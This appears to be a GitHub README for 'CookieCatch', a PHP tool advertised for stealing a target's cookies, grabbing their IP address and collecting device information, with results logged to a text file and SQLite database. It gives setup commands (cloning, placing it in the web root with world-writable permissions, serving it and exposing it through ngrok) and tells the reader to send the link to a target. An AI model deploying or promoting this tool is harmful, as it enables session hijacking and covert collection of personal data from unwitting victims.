# CookieCatch
PHP script for stealing cookies, IP grabbing &amp; Device Information. 

CookieCatch will attempt to steal a targets cookies as well as collect information about the device. Outputs are written in both a textfile & SQLite3 database to allow for easy use of collected data in other tools.

# Usage
```
git clone https://github.com/4xx404/CookieCatch
mv ~/CookieCatch /var/www/html/ && cd /var/www/html/CookieCatch/
chmod 777 index.php && cd ../
php -S localhost:80
```

# Include Ngrok
```
ngrok http 80
```

Send the link to your target.  
  
Example link using ngrok: http://af9cea23de3.ngrok.io/CookieCatch/
